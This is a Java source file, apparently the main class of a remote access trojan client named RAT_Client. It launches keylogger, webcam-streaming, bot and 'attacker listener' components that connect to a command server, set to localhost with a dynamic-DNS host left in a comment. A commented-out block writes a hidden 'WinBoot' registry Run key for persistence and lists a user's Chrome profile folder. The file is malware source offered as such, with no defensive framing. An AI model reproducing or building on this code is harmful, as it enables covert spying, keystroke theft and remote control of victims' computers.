package rat_client;

import java.io.File;
import java.io.IOException;
import javax.swing.JFrame;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Win32Exception;
import static com.sun.jna.platform.win32.WinReg.HKEY_CURRENT_USER;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class RAT_Client extends JFrame
{
    public static void main(String[] args)
    {
        /*try            //WINDOWS REGEDIT
        {
            try
            {
                String path=Advapi32Util.registryGetStringValue(HKEY_CURRENT_USER,
                                                                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                                                "WinBoot");
                String username=Advapi32Util.registryGetStringValue(HKEY_CURRENT_USER,
                                                                "Volatile Environment",
                                                                "USERNAME");
                System.out.println(username);
            }
            catch(Win32Exception exc)
            {
                Runtime.getRuntime().exec("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WinBoot /t REG_SZ /d "
                                          +new File("").getAbsolutePath()+"\\dist\\RAT_Client.jar");
            }
            
            Process p=Runtime.getRuntime().exec("cmd.exe /c"+"dir \"C:\\Users\\daniele\\AppData\\Local\\Google\\Chrome\\User Data\\Default\"");
            BufferedReader in=new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while((line=in.readLine())!=null) 
                  System.out.println(line);    
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }*/
        String ip_address="localhost";//"thedeveloper01.ddns.net";
        new LifeMonitor(ip_address,54326);
        new Bot(ip_address,54321);
        new KeyLoggerBot(ip_address,54322);
        new AttackerListener(ip_address,54324);
        new WebCamStream(ip_address,54325);  
    }
}